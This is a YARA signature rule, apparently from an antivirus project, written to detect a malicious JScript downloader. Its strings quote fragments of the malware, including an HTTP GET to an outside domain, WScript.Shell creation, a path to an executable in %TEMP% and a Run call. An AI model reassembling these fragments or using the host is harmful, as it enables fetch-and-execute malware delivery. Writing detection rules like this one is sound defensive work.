rule sig_20160330_18daf23bdaececa590ac5e25969084b4 {
  meta:
    description = "datamaliciousorder - file 20160330_18daf23bdaececa590ac5e25969084b4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "39d6f96d2ad4fdd5911f3137bd635a7df440f9f128ac3c94921e1c8e3de07580"

  strings:
    $s1  = "V0[TI](\"GET\", \"http://be-stlines-tore.com/k3soa\", false);" fullword ascii
    $s2  = "var PK = function W() {return WScript[Y0](\"WScript\"+\".Shell\");}(), O = 11;" fullword ascii
    $s3  = "function AI(A1, K0){K = K * 1; return A1 - K0;};" fullword ascii
    $s4  = "if (V0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function LO() {return PK[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ovibhDRb.ex\" + \"e\";};" fullword ascii
    $s6  = "function X(){return UO + \"\";};" fullword ascii
    $s7  = "function M(TW){PK[\"Run\"](TW, K, K);};" fullword ascii
    $s8  = "function JK() {return ((RN == true) && (RN == R)) ? 1 : K;};" fullword ascii
    $s9  = "function V(){return 22;};" fullword ascii
    $s10 = "function TO()" fullword ascii
    $s11 = "function H(){return Y0;};" fullword ascii
    $s12 = "function IW(RH) {var IF = (1, 2, 3, 4, 5, RH); return IF;};" fullword ascii
    $s13 = "var Y2 = new this[\"Date\"]();" fullword ascii
    $s14 = "return AI(G, Z0);" fullword ascii
    $s15 = "}while (WT);" fullword ascii
    $s16 = "var A0 = false;" fullword ascii
    $s17 = "var RN = false;" fullword ascii
    $s18 = "RN = true; " fullword ascii
    $s19 = "} catch(ED){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}